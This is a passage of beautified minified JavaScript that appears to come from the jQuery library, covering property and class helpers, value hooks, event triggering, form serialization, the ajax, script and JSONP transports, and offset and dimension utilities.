    }, x.each(x.expr.match.bool.source.match(/\w+/g), (function(e, t) {
        var i = dt[t] || x.find.attr;
        dt[t] = function(e, t, n) {
            var o, r, s = t.toLowerCase();
            return n || (r = dt[s], dt[s] = o, o = null != i(e, t, n) ? s : null, dt[s] = r), o
        }
    }));
    var pt = /^(?:input|select|textarea|button)$/i,
        ft = /^(?:a|area)$/i;

    function ht(e) {
        return (e.match(L) || []).join(" ")
    }

    function vt(e) {
        return e.getAttribute && e.getAttribute("class") || ""
    }

    function gt(e) {
        return Array.isArray(e) ? e : "string" == typeof e && e.match(L) || []
    }
    x.fn.extend({
        prop: function(e, t) {
            return R(this, x.prop, e, t, arguments.length > 1)
        },
        removeProp: function(e) {
            return this.each((function() {
                delete this[x.propFix[e] || e]
            }))
        }
    }), x.extend({
        prop: function(e, t, i) {
            var n, o, r = e.nodeType;
            if (3 !== r && 8 !== r && 2 !== r) return 1 === r && x.isXMLDoc(e) || (t = x.propFix[t] || t, o = x.propHooks[t]), void 0 !== i ? o && "set" in o && void 0 !== (n = o.set(e, i, t)) ? n : e[t] = i : o && "get" in o && null !== (n = o.get(e, t)) ? n : e[t]
        },
        propHooks: {
            tabIndex: {
                get: function(e) {
                    var t = x.find.attr(e, "tabindex");
                    return t ? parseInt(t, 10) : pt.test(e.nodeName) || ft.test(e.nodeName) && e.href ? 0 : -1
                }
            }
        },
        propFix: {
            for: "htmlFor",
            class: "className"
        }
    }), f.optSelected || (x.propHooks.selected = {
        get: function(e) {
            var t = e.parentNode;
            return t && t.parentNode && t.parentNode.selectedIndex, null
        },
        set: function(e) {
            var t = e.parentNode;
            t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex)
        }
    }), x.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], (function() {
        x.propFix[this.toLowerCase()] = this
    })), x.fn.extend({
        addClass: function(e) {
            var t, i, n, o, r, s, a, l = 0;
            if (h(e)) return this.each((function(t) {
                x(this).addClass(e.call(this, t, vt(this)))
            }));
            if ((t = gt(e)).length)
                for (; i = this[l++];)
                    if (o = vt(i), n = 1 === i.nodeType && " " + ht(o) + " ") {
                        for (s = 0; r = t[s++];) n.indexOf(" " + r + " ") < 0 && (n += r + " ");
                        o !== (a = ht(n)) && i.setAttribute("class", a)
                    } return this
        },
        removeClass: function(e) {
            var t, i, n, o, r, s, a, l = 0;
            if (h(e)) return this.each((function(t) {
                x(this).removeClass(e.call(this, t, vt(this)))
            }));
            if (!arguments.length) return this.attr("class", "");
            if ((t = gt(e)).length)
                for (; i = this[l++];)
                    if (o = vt(i), n = 1 === i.nodeType && " " + ht(o) + " ") {
                        for (s = 0; r = t[s++];)
                            for (; n.indexOf(" " + r + " ") > -1;) n = n.replace(" " + r + " ", " ");
                        o !== (a = ht(n)) && i.setAttribute("class", a)
                    } return this
        },
        toggleClass: function(e, t) {
            var i = typeof e,
                n = "string" === i || Array.isArray(e);
            return "boolean" == typeof t && n ? t ? this.addClass(e) : this.removeClass(e) : h(e) ? this.each((function(i) {
                x(this).toggleClass(e.call(this, i, vt(this), t), t)
            })) : this.each((function() {
                var t, o, r, s;
                if (n)
                    for (o = 0, r = x(this), s = gt(e); t = s[o++];) r.hasClass(t) ? r.removeClass(t) : r.addClass(t);
                else void 0 !== e && "boolean" !== i || ((t = vt(this)) && U.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : U.get(this, "__className__") || ""))
            }))
        },
        hasClass: function(e) {
            var t, i, n = 0;
            for (t = " " + e + " "; i = this[n++];)
                if (1 === i.nodeType && (" " + ht(vt(i)) + " ").indexOf(t) > -1) return !0;
            return !1
        }
    });
    var mt = /\r/g;
    x.fn.extend({
        val: function(e) {
            var t, i, n, o = this[0];
            return arguments.length ? (n = h(e), this.each((function(i) {
                var o;
                1 === this.nodeType && (null == (o = n ? e.call(this, i, x(this).val()) : e) ? o = "" : "number" == typeof o ? o += "" : Array.isArray(o) && (o = x.map(o, (function(e) {
                    return null == e ? "" : e + ""
                }))), (t = x.valHooks[this.type] || x.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, o, "value") || (this.value = o))
            }))) : o ? (t = x.valHooks[o.type] || x.valHooks[o.nodeName.toLowerCase()]) && "get" in t && void 0 !== (i = t.get(o, "value")) ? i : "string" == typeof(i = o.value) ? i.replace(mt, "") : null == i ? "" : i : void 0
        }
    }), x.extend({
        valHooks: {
            option: {
                get: function(e) {
                    var t = x.find.attr(e, "value");
                    return null != t ? t : ht(x.text(e))
                }
            },
            select: {
                get: function(e) {
                    var t, i, n, o = e.options,
                        r = e.selectedIndex,
                        s = "select-one" === e.type,
                        a = s ? null : [],
                        l = s ? r + 1 : o.length;
                    for (n = r < 0 ? l : s ? r : 0; n < l; n++)
                        if (((i = o[n]).selected || n === r) && !i.disabled && (!i.parentNode.disabled || !$(i.parentNode, "optgroup"))) {
                            if (t = x(i).val(), s) return t;
                            a.push(t)
                        } return a
                },
                set: function(e, t) {
                    for (var i, n, o = e.options, r = x.makeArray(t), s = o.length; s--;)((n = o[s]).selected = x.inArray(x.valHooks.option.get(n), r) > -1) && (i = !0);
                    return i || (e.selectedIndex = -1), r
                }
            }
        }
    }), x.each(["radio", "checkbox"], (function() {
        x.valHooks[this] = {
            set: function(e, t) {
                if (Array.isArray(t)) return e.checked = x.inArray(x(e).val(), t) > -1
            }
        }, f.checkOn || (x.valHooks[this].get = function(e) {
            return null === e.getAttribute("value") ? "on" : e.value
        })
    })), f.focusin = "onfocusin" in e;
    var yt = /^(?:focusinfocus|focusoutblur)$/,
        bt = function(e) {
            e.stopPropagation()
        };
    x.extend(x.event, {
        trigger: function(t, i, n, o) {
            var r, s, a, l, c, d, p, f, m = [n || g],
                y = u.call(t, "type") ? t.type : t,
                b = u.call(t, "namespace") ? t.namespace.split(".") : [];
            if (s = f = a = n = n || g, 3 !== n.nodeType && 8 !== n.nodeType && !yt.test(y + x.event.triggered) && (y.indexOf(".") > -1 && (b = y.split("."), y = b.shift(), b.sort()), c = y.indexOf(":") < 0 && "on" + y, (t = t[x.expando] ? t : new x.Event(y, "object" == typeof t && t)).isTrigger = o ? 2 : 3, t.namespace = b.join("."), t.rnamespace = t.namespace ? new RegExp("(^|\\.)" + b.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = n), i = null == i ? [t] : x.makeArray(i, [t]), p = x.event.special[y] || {}, o || !p.trigger || !1 !== p.trigger.apply(n, i))) {
                if (!o && !p.noBubble && !v(n)) {
                    for (l = p.delegateType || y, yt.test(l + y) || (s = s.parentNode); s; s = s.parentNode) m.push(s), a = s;
                    a === (n.ownerDocument || g) && m.push(a.defaultView || a.parentWindow || e)
                }
                for (r = 0;
                    (s = m[r++]) && !t.isPropagationStopped();) f = s, t.type = r > 1 ? l : p.bindType || y, (d = (U.get(s, "events") || Object.create(null))[t.type] && U.get(s, "handle")) && d.apply(s, i), (d = c && s[c]) && d.apply && Q(s) && (t.result = d.apply(s, i), !1 === t.result && t.preventDefault());
                return t.type = y, o || t.isDefaultPrevented() || p._default && !1 !== p._default.apply(m.pop(), i) || !Q(n) || c && h(n[y]) && !v(n) && ((a = n[c]) && (n[c] = null), x.event.triggered = y, t.isPropagationStopped() && f.addEventListener(y, bt), n[y](), t.isPropagationStopped() && f.removeEventListener(y, bt), x.event.triggered = void 0, a && (n[c] = a)), t.result
            }
        },
        simulate: function(e, t, i) {
            var n = x.extend(new x.Event, i, {
                type: e,
                isSimulated: !0
            });
            x.event.trigger(n, null, t)
        }
    }), x.fn.extend({
        trigger: function(e, t) {
            return this.each((function() {
                x.event.trigger(e, t, this)
            }))
        },
        triggerHandler: function(e, t) {
            var i = this[0];
            if (i) return x.event.trigger(e, t, i, !0)
        }
    }), f.focusin || x.each({
        focus: "focusin",
        blur: "focusout"
    }, (function(e, t) {
        var i = function(e) {
            x.event.simulate(t, e.target, x.event.fix(e))
        };
        x.event.special[t] = {
            setup: function() {
                var n = this.ownerDocument || this.document || this,
                    o = U.access(n, t);
                o || n.addEventListener(e, i, !0), U.access(n, t, (o || 0) + 1)
            },
            teardown: function() {
                var n = this.ownerDocument || this.document || this,
                    o = U.access(n, t) - 1;
                o ? U.access(n, t, o) : (n.removeEventListener(e, i, !0), U.remove(n, t))
            }
        }
    }));
    var wt = e.location,
        xt = {
            guid: Date.now()
        },
        kt = /\?/;
    x.parseXML = function(t) {
        var i, n;
        if (!t || "string" != typeof t) return null;
        try {
            i = (new e.DOMParser).parseFromString(t, "text/xml")
        } catch (e) {}
        return n = i && i.getElementsByTagName("parsererror")[0], i && !n || x.error("Invalid XML: " + (n ? x.map(n.childNodes, (function(e) {
            return e.textContent
        })).join("\n") : t)), i
    };
    var Ct = /\[\]$/,
        Tt = /\r?\n/g,
        St = /^(?:submit|button|image|reset|file)$/i,
        At = /^(?:input|select|textarea|keygen)/i;

    function $t(e, t, i, n) {
        var o;
        if (Array.isArray(t)) x.each(t, (function(t, o) {
            i || Ct.test(e) ? n(e, o) : $t(e + "[" + ("object" == typeof o && null != o ? t : "") + "]", o, i, n)
        }));
        else if (i || "object" !== b(t)) n(e, t);
        else
            for (o in t) $t(e + "[" + o + "]", t[o], i, n)
    }
    x.param = function(e, t) {
        var i, n = [],
            o = function(e, t) {
                var i = h(t) ? t() : t;
                n[n.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == i ? "" : i)
            };
        if (null == e) return "";
        if (Array.isArray(e) || e.jquery && !x.isPlainObject(e)) x.each(e, (function() {
            o(this.name, this.value)
        }));
        else
            for (i in e) $t(i, e[i], t, o);
        return n.join("&")
    }, x.fn.extend({
        serialize: function() {
            return x.param(this.serializeArray())
        },
        serializeArray: function() {
            return this.map((function() {
                var e = x.prop(this, "elements");
                return e ? x.makeArray(e) : this
            })).filter((function() {
                var e = this.type;
                return this.name && !x(this).is(":disabled") && At.test(this.nodeName) && !St.test(e) && (this.checked || !fe.test(e))
            })).map((function(e, t) {
                var i = x(this).val();
                return null == i ? null : Array.isArray(i) ? x.map(i, (function(e) {
                    return {
                        name: t.name,
                        value: e.replace(Tt, "\r\n")
                    }
                })) : {
                    name: t.name,
                    value: i.replace(Tt, "\r\n")
                }
            })).get()
        }
    });
    var Et = /%20/g,
        Pt = /#.*$/,
        Ot = /([?&])_=[^&]*/,
        Dt = /^(.*?):[ \t]*([^\r\n]*)$/gm,
        Mt = /^(?:GET|HEAD)$/,
        jt = /^\/\//,
        qt = {},
        Lt = {},
        Ht = "*/".concat("*"),
        Nt = g.createElement("a");

    function It(e) {
        return function(t, i) {
            "string" != typeof t && (i = t, t = "*");
            var n, o = 0,
                r = t.toLowerCase().match(L) || [];
            if (h(i))
                for (; n = r[o++];) "+" === n[0] ? (n = n.slice(1) || "*", (e[n] = e[n] || []).unshift(i)) : (e[n] = e[n] || []).push(i)
        }
    }

    function zt(e, t, i, n) {
        var o = {},
            r = e === Lt;

        function s(a) {
            var l;
            return o[a] = !0, x.each(e[a] || [], (function(e, a) {
                var c = a(t, i, n);
                return "string" != typeof c || r || o[c] ? r ? !(l = c) : void 0 : (t.dataTypes.unshift(c), s(c), !1)
            })), l
        }
        return s(t.dataTypes[0]) || !o["*"] && s("*")
    }

    function _t(e, t) {
        var i, n, o = x.ajaxSettings.flatOptions || {};
        for (i in t) void 0 !== t[i] && ((o[i] ? e : n || (n = {}))[i] = t[i]);
        return n && x.extend(!0, e, n), e
    }
    Nt.href = wt.href, x.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: wt.href,
            type: "GET",
            isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(wt.protocol),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": Ht,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /\bxml\b/,
                html: /\bhtml/,
                json: /\bjson\b/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": JSON.parse,
                "text xml": x.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(e, t) {
            return t ? _t(_t(e, x.ajaxSettings), t) : _t(x.ajaxSettings, e)
        },
        ajaxPrefilter: It(qt),
        ajaxTransport: It(Lt),
        ajax: function(t, i) {
            "object" == typeof t && (i = t, t = void 0), i = i || {};
            var n, o, r, s, a, l, c, u, d, p, f = x.ajaxSetup({}, i),
                h = f.context || f,
                v = f.context && (h.nodeType || h.jquery) ? x(h) : x.event,
                m = x.Deferred(),
                y = x.Callbacks("once memory"),
                b = f.statusCode || {},
                w = {},
                k = {},
                C = "canceled",
                T = {
                    readyState: 0,
                    getResponseHeader: function(e) {
                        var t;
                        if (c) {
                            if (!s)
                                for (s = {}; t = Dt.exec(r);) s[t[1].toLowerCase() + " "] = (s[t[1].toLowerCase() + " "] || []).concat(t[2]);
                            t = s[e.toLowerCase() + " "]
                        }
                        return null == t ? null : t.join(", ")
                    },
                    getAllResponseHeaders: function() {
                        return c ? r : null
                    },
                    setRequestHeader: function(e, t) {
                        return null == c && (e = k[e.toLowerCase()] = k[e.toLowerCase()] || e, w[e] = t), this
                    },
                    overrideMimeType: function(e) {
                        return null == c && (f.mimeType = e), this
                    },
                    statusCode: function(e) {
                        var t;
                        if (e)
                            if (c) T.always(e[T.status]);
                            else
                                for (t in e) b[t] = [b[t], e[t]];
                        return this
                    },
                    abort: function(e) {
                        var t = e || C;
                        return n && n.abort(t), S(0, t), this
                    }
                };
            if (m.promise(T), f.url = ((t || f.url || wt.href) + "").replace(jt, wt.protocol + "//"), f.type = i.method || i.type || f.method || f.type, f.dataTypes = (f.dataType || "*").toLowerCase().match(L) || [""], null == f.crossDomain) {
                l = g.createElement("a");
                try {
                    l.href = f.url, l.href = l.href, f.crossDomain = Nt.protocol + "//" + Nt.host != l.protocol + "//" + l.host
                } catch (e) {
                    f.crossDomain = !0
                }
            }
            if (f.data && f.processData && "string" != typeof f.data && (f.data = x.param(f.data, f.traditional)), zt(qt, f, i, T), c) return T;
            for (d in (u = x.event && f.global) && 0 == x.active++ && x.event.trigger("ajaxStart"), f.type = f.type.toUpperCase(), f.hasContent = !Mt.test(f.type), o = f.url.replace(Pt, ""), f.hasContent ? f.data && f.processData && 0 === (f.contentType || "").indexOf("application/x-www-form-urlencoded") && (f.data = f.data.replace(Et, "+")) : (p = f.url.slice(o.length), f.data && (f.processData || "string" == typeof f.data) && (o += (kt.test(o) ? "&" : "?") + f.data, delete f.data), !1 === f.cache && (o = o.replace(Ot, "$1"), p = (kt.test(o) ? "&" : "?") + "_=" + xt.guid++ + p), f.url = o + p), f.ifModified && (x.lastModified[o] && T.setRequestHeader("If-Modified-Since", x.lastModified[o]), x.etag[o] && T.setRequestHeader("If-None-Match", x.etag[o])), (f.data && f.hasContent && !1 !== f.contentType || i.contentType) && T.setRequestHeader("Content-Type", f.contentType), T.setRequestHeader("Accept", f.dataTypes[0] && f.accepts[f.dataTypes[0]] ? f.accepts[f.dataTypes[0]] + ("*" !== f.dataTypes[0] ? ", " + Ht + "; q=0.01" : "") : f.accepts["*"]), f.headers) T.setRequestHeader(d, f.headers[d]);
            if (f.beforeSend && (!1 === f.beforeSend.call(h, T, f) || c)) return T.abort();
            if (C = "abort", y.add(f.complete), T.done(f.success), T.fail(f.error), n = zt(Lt, f, i, T)) {
                if (T.readyState = 1, u && v.trigger("ajaxSend", [T, f]), c) return T;
                f.async && f.timeout > 0 && (a = e.setTimeout((function() {
                    T.abort("timeout")
                }), f.timeout));
                try {
                    c = !1, n.send(w, S)
                } catch (e) {
                    if (c) throw e;
                    S(-1, e)
                }
            } else S(-1, "No Transport");

            function S(t, i, s, l) {
                var d, p, g, w, k, C = i;
                c || (c = !0, a && e.clearTimeout(a), n = void 0, r = l || "", T.readyState = t > 0 ? 4 : 0, d = t >= 200 && t < 300 || 304 === t, s && (w = function(e, t, i) {
                    for (var n, o, r, s, a = e.contents, l = e.dataTypes;
                        "*" === l[0];) l.shift(), void 0 === n && (n = e.mimeType || t.getResponseHeader("Content-Type"));
                    if (n)
                        for (o in a)
                            if (a[o] && a[o].test(n)) {
                                l.unshift(o);
                                break
                            } if (l[0] in i) r = l[0];
                    else {
                        for (o in i) {
                            if (!l[0] || e.converters[o + " " + l[0]]) {
                                r = o;
                                break
                            }
                            s || (s = o)
                        }
                        r = r || s
                    }
                    if (r) return r !== l[0] && l.unshift(r), i[r]
                }(f, T, s)), !d && x.inArray("script", f.dataTypes) > -1 && x.inArray("json", f.dataTypes) < 0 && (f.converters["text script"] = function() {}), w = function(e, t, i, n) {
                    var o, r, s, a, l, c = {},
                        u = e.dataTypes.slice();
                    if (u[1])
                        for (s in e.converters) c[s.toLowerCase()] = e.converters[s];
                    for (r = u.shift(); r;)
                        if (e.responseFields[r] && (i[e.responseFields[r]] = t), !l && n && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = r, r = u.shift())
                            if ("*" === r) r = l;
                            else if ("*" !== l && l !== r) {
                        if (!(s = c[l + " " + r] || c["* " + r]))
                            for (o in c)
                                if ((a = o.split(" "))[1] === r && (s = c[l + " " + a[0]] || c["* " + a[0]])) {
                                    !0 === s ? s = c[o] : !0 !== c[o] && (r = a[0], u.unshift(a[1]));
                                    break
                                } if (!0 !== s)
                            if (s && e.throws) t = s(t);
                            else try {
                                t = s(t)
                            } catch (e) {
                                return {
                                    state: "parsererror",
                                    error: s ? e : "No conversion from " + l + " to " + r
                                }
                            }
                    }
                    return {
                        state: "success",
                        data: t
                    }
                }(f, w, T, d), d ? (f.ifModified && ((k = T.getResponseHeader("Last-Modified")) && (x.lastModified[o] = k), (k = T.getResponseHeader("etag")) && (x.etag[o] = k)), 204 === t || "HEAD" === f.type ? C = "nocontent" : 304 === t ? C = "notmodified" : (C = w.state, p = w.data, d = !(g = w.error))) : (g = C, !t && C || (C = "error", t < 0 && (t = 0))), T.status = t, T.statusText = (i || C) + "", d ? m.resolveWith(h, [p, C, T]) : m.rejectWith(h, [T, C, g]), T.statusCode(b), b = void 0, u && v.trigger(d ? "ajaxSuccess" : "ajaxError", [T, f, d ? p : g]), y.fireWith(h, [T, C]), u && (v.trigger("ajaxComplete", [T, f]), --x.active || x.event.trigger("ajaxStop")))
            }
            return T
        },
        getJSON: function(e, t, i) {
            return x.get(e, t, i, "json")
        },
        getScript: function(e, t) {
            return x.get(e, void 0, t, "script")
        }
    }), x.each(["get", "post"], (function(e, t) {
        x[t] = function(e, i, n, o) {
            return h(i) && (o = o || n, n = i, i = void 0), x.ajax(x.extend({
                url: e,
                type: t,
                dataType: o,
                data: i,
                success: n
            }, x.isPlainObject(e) && e))
        }
    })), x.ajaxPrefilter((function(e) {
        var t;
        for (t in e.headers) "content-type" === t.toLowerCase() && (e.contentType = e.headers[t] || "")
    })), x._evalUrl = function(e, t, i) {
        return x.ajax({
            url: e,
            type: "GET",
            dataType: "script",
            cache: !0,
            async: !1,
            global: !1,
            converters: {
                "text script": function() {}
            },
            dataFilter: function(e) {
                x.globalEval(e, t, i)
            }
        })
    }, x.fn.extend({
        wrapAll: function(e) {
            var t;
            return this[0] && (h(e) && (e = e.call(this[0])), t = x(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map((function() {
                for (var e = this; e.firstElementChild;) e = e.firstElementChild;
                return e
            })).append(this)), this
        },
        wrapInner: function(e) {
            return h(e) ? this.each((function(t) {
                x(this).wrapInner(e.call(this, t))
            })) : this.each((function() {
                var t = x(this),
                    i = t.contents();
                i.length ? i.wrapAll(e) : t.append(e)
            }))
        },
        wrap: function(e) {
            var t = h(e);
            return this.each((function(i) {
                x(this).wrapAll(t ? e.call(this, i) : e)
            }))
        },
        unwrap: function(e) {
            return this.parent(e).not("body").each((function() {
                x(this).replaceWith(this.childNodes)
            })), this
        }
    }), x.expr.pseudos.hidden = function(e) {
        return !x.expr.pseudos.visible(e)
    }, x.expr.pseudos.visible = function(e) {
        return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length)
    }, x.ajaxSettings.xhr = function() {
        try {
            return new e.XMLHttpRequest
        } catch (e) {}
    };
    var Wt = {
            0: 200,
            1223: 204
        },
        Rt = x.ajaxSettings.xhr();
    f.cors = !!Rt && "withCredentials" in Rt, f.ajax = Rt = !!Rt, x.ajaxTransport((function(t) {
        var i, n;
        if (f.cors || Rt && !t.crossDomain) return {
            send: function(o, r) {
                var s, a = t.xhr();
                if (a.open(t.type, t.url, t.async, t.username, t.password), t.xhrFields)
                    for (s in t.xhrFields) a[s] = t.xhrFields[s];
                for (s in t.mimeType && a.overrideMimeType && a.overrideMimeType(t.mimeType), t.crossDomain || o["X-Requested-With"] || (o["X-Requested-With"] = "XMLHttpRequest"), o) a.setRequestHeader(s, o[s]);
                i = function(e) {
                    return function() {
                        i && (i = n = a.onload = a.onerror = a.onabort = a.ontimeout = a.onreadystatechange = null, "abort" === e ? a.abort() : "error" === e ? "number" != typeof a.status ? r(0, "error") : r(a.status, a.statusText) : r(Wt[a.status] || a.status, a.statusText, "text" !== (a.responseType || "text") || "string" != typeof a.responseText ? {
                            binary: a.response
                        } : {
                            text: a.responseText
                        }, a.getAllResponseHeaders()))
                    }
                }, a.onload = i(), n = a.onerror = a.ontimeout = i("error"), void 0 !== a.onabort ? a.onabort = n : a.onreadystatechange = function() {
                    4 === a.readyState && e.setTimeout((function() {
                        i && n()
                    }))
                }, i = i("abort");
                try {
                    a.send(t.hasContent && t.data || null)
                } catch (e) {
                    if (i) throw e
                }
            },
            abort: function() {
                i && i()
            }
        }
    })), x.ajaxPrefilter((function(e) {
        e.crossDomain && (e.contents.script = !1)
    })), x.ajaxSetup({
        accepts: {
            script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
        },
        contents: {
            script: /\b(?:java|ecma)script\b/
        },
        converters: {
            "text script": function(e) {
                return x.globalEval(e), e
            }
        }
    }), x.ajaxPrefilter("script", (function(e) {
        void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET")
    })), x.ajaxTransport("script", (function(e) {
        var t, i;
        if (e.crossDomain || e.scriptAttrs) return {
            send: function(n, o) {
                t = x("<script>").attr(e.scriptAttrs || {}).prop({
                    charset: e.scriptCharset,
                    src: e.url
                }).on("load error", i = function(e) {
                    t.remove(), i = null, e && o("error" === e.type ? 404 : 200, e.type)
                }), g.head.appendChild(t[0])
            },
            abort: function() {
                i && i()
            }
        }
    }));
    var Ft, Vt = [],
        Xt = /(=)\?(?=&|$)|\?\?/;
    x.ajaxSetup({
        jsonp: "callback",
        jsonpCallback: function() {
            var e = Vt.pop() || x.expando + "_" + xt.guid++;
            return this[e] = !0, e
        }
    }), x.ajaxPrefilter("json jsonp", (function(t, i, n) {
        var o, r, s, a = !1 !== t.jsonp && (Xt.test(t.url) ? "url" : "string" == typeof t.data && 0 === (t.contentType || "").indexOf("application/x-www-form-urlencoded") && Xt.test(t.data) && "data");
        if (a || "jsonp" === t.dataTypes[0]) return o = t.jsonpCallback = h(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback, a ? t[a] = t[a].replace(Xt, "$1" + o) : !1 !== t.jsonp && (t.url += (kt.test(t.url) ? "&" : "?") + t.jsonp + "=" + o), t.converters["script json"] = function() {
            return s || x.error(o + " was not called"), s[0]
        }, t.dataTypes[0] = "json", r = e[o], e[o] = function() {
            s = arguments
        }, n.always((function() {
            void 0 === r ? x(e).removeProp(o) : e[o] = r, t[o] && (t.jsonpCallback = i.jsonpCallback, Vt.push(o)), s && h(r) && r(s[0]), s = r = void 0
        })), "script"
    })), f.createHTMLDocument = ((Ft = g.implementation.createHTMLDocument("").body).innerHTML = "<form></form><form></form>", 2 === Ft.childNodes.length), x.parseHTML = function(e, t, i) {
        return "string" != typeof e ? [] : ("boolean" == typeof t && (i = t, t = !1), t || (f.createHTMLDocument ? ((n = (t = g.implementation.createHTMLDocument("")).createElement("base")).href = g.location.href, t.head.appendChild(n)) : t = g), r = !i && [], (o = E.exec(e)) ? [t.createElement(o[1])] : (o = we([e], t, r), r && r.length && x(r).remove(), x.merge([], o.childNodes)));
        var n, o, r
    }, x.fn.load = function(e, t, i) {
        var n, o, r, s = this,
            a = e.indexOf(" ");
        return a > -1 && (n = ht(e.slice(a)), e = e.slice(0, a)), h(t) ? (i = t, t = void 0) : t && "object" == typeof t && (o = "POST"), s.length > 0 && x.ajax({
            url: e,
            type: o || "GET",
            dataType: "html",
            data: t
        }).done((function(e) {
            r = arguments, s.html(n ? x("<div>").append(x.parseHTML(e)).find(n) : e)
        })).always(i && function(e, t) {
            s.each((function() {
                i.apply(this, r || [e.responseText, t, e])
            }))
        }), this
    }, x.expr.pseudos.animated = function(e) {
        return x.grep(x.timers, (function(t) {
            return e === t.elem
        })).length
    }, x.offset = {
        setOffset: function(e, t, i) {
            var n, o, r, s, a, l, c = x.css(e, "position"),
                u = x(e),
                d = {};
            "static" === c && (e.style.position = "relative"), a = u.offset(), r = x.css(e, "top"), l = x.css(e, "left"), ("absolute" === c || "fixed" === c) && (r + l).indexOf("auto") > -1 ? (s = (n = u.position()).top, o = n.left) : (s = parseFloat(r) || 0, o = parseFloat(l) || 0), h(t) && (t = t.call(e, i, x.extend({}, a))), null != t.top && (d.top = t.top - a.top + s), null != t.left && (d.left = t.left - a.left + o), "using" in t ? t.using.call(e, d) : u.css(d)
        }
    }, x.fn.extend({
        offset: function(e) {
            if (arguments.length) return void 0 === e ? this : this.each((function(t) {
                x.offset.setOffset(this, e, t)
            }));
            var t, i, n = this[0];
            return n ? n.getClientRects().length ? (t = n.getBoundingClientRect(), i = n.ownerDocument.defaultView, {
                top: t.top + i.pageYOffset,
                left: t.left + i.pageXOffset
            }) : {
                top: 0,
                left: 0
            } : void 0
        },
        position: function() {
            if (this[0]) {
                var e, t, i, n = this[0],
                    o = {
                        top: 0,
                        left: 0
                    };
                if ("fixed" === x.css(n, "position")) t = n.getBoundingClientRect();
                else {
                    for (t = this.offset(), i = n.ownerDocument, e = n.offsetParent || i.documentElement; e && (e === i.body || e === i.documentElement) && "static" === x.css(e, "position");) e = e.parentNode;
                    e && e !== n && 1 === e.nodeType && ((o = x(e).offset()).top += x.css(e, "borderTopWidth", !0), o.left += x.css(e, "borderLeftWidth", !0))
                }
                return {
                    top: t.top - o.top - x.css(n, "marginTop", !0),
                    left: t.left - o.left - x.css(n, "marginLeft", !0)
                }
            }
        },
        offsetParent: function() {
            return this.map((function() {
                for (var e = this.offsetParent; e && "static" === x.css(e, "position");) e = e.offsetParent;
                return e || ne
            }))
        }
    }), x.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, (function(e, t) {
        var i = "pageYOffset" === t;
        x.fn[e] = function(n) {
            return R(this, (function(e, n, o) {
                var r;
                if (v(e) ? r = e : 9 === e.nodeType && (r = e.defaultView), void 0 === o) return r ? r[t] : e[n];
                r ? r.scrollTo(i ? r.pageXOffset : o, i ? o : r.pageYOffset) : e[n] = o
            }), e, n, arguments.length)
        }
    })), x.each(["top", "left"], (function(e, t) {
        x.cssHooks[t] = Re(f.pixelPosition, (function(e, i) {
            if (i) return i = We(e, t), Ne.test(i) ? x(e).position()[t] + "px" : i
        }))
    })), x.each({
        Height: "height",
        Width: "width"
    }, (function(e, t) {
        x.each({
            padding: "inner" + e,
            content: t,
            "": "outer" + e
        }, (function(i, n) {
            x.fn[n] = function(o, r) {
                var s = arguments.length && (i || "boolean" != typeof o),
                    a = i || (!0 === o || !0 === r ? "margin" : "border");
                return R(this, (function(t, i, o) {
                    var r;
                    return v(t) ? 0 === n.indexOf("outer") ? t["inner" + e] : t.document.documentElement["client" + e] : 9 === t.nodeType ? (r = t.documentElement, Math.max(t.body["scroll" + e], r["scroll" + e], t.body["offset" + e], r["offset" + e], r["client" + e])) : void 0 === o ? x.css(t, i, a) : x.style(t, i, o, a)
                }), t, s ? o : void 0, s)
            }
        }))
    })), x.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], (function(e, t) {
        x.fn[t] = function(e) {
            return this.on(t, e)
        }
    })), x.fn.extend({
        bind: function(e, t, i) {
            return this.on(e, null, t, i)
        },
        unbind: function(e, t) {
            return this.off(e, null, t)
        },
        delegate: function(e, t, i, n) {
            return this.on(t, e, i, n)
        },
        undelegate: function(e, t, i) {
            return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", i)
        },
        hover: function(e, t) {
            return this.mouseenter(e).mouseleave(t || e)
        }
    }), x.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), (function(e, t) {
        x.fn[t] = function(e, i) {
            return arguments.length > 0 ? this.on(t, null, e, i) : this.trigger(t)
        }
    }));
    var Bt = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
    x.proxy = function(e, t) {
        var i, n, r;
        if ("string" == typeof t && (i = e[t], t = e, e = i), h(e)) return n = o.call(arguments, 2), r = function() {
            return e.apply(t || this, n.concat(o.call(arguments)))
        }, r.guid = e.guid = e.guid || x.guid++, r
    }, x.holdReady = function(e) {
        e ? x.readyWait++ : x.ready(!0)
    }, x.isArray = Array.isArray, x.parseJSON = JSON.parse, x.nodeName = $, x.isFunction = h, x.isWindow = v, x.camelCase = B, x.type = b, x.now = Date.now, x.isNumeric = function(e) {
        var t = x.type(e);
